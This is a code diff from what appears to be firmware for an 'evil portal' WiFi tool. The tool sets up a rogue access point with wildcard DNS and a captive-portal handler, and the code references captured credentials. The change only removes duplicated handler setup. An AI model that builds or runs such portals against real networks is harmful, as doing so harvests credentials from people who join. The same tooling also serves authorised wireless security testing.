@@ -261,9 +261,7 @@ void EvilPortal::restartWiFi(bool reset) {
     dnsServer.start(53, "*", WiFi.softAPIP());
     webServer.begin();
     
-    // Create NEW handler
-    _captiveHandler = new CaptiveRequestHandler(this);
-    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
+    // Handler is created in setupRoutes(), no need to do it again
     
     if (reset) resetCapturedCredentials();
 }
@@ -334,13 +332,11 @@ void EvilPortal::loop() {
                         vTaskDelay(100);
                         WiFi.softAP(apName, emptyString, _channel);
                         vTaskDelay(100);
+                        
+                        // setupRoutes() will create the handler - we don't need to do it manually
                         setupRoutes();
                         dnsServer.start(53, "*", WiFi.softAPIP());
                         webServer.begin();
-                        
-                        // Re-add handler (it was removed by webServer.end())
-                        _captiveHandler = new CaptiveRequestHandler(this);
-                        webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
                         
                         shouldRedraw = true;
                     }});
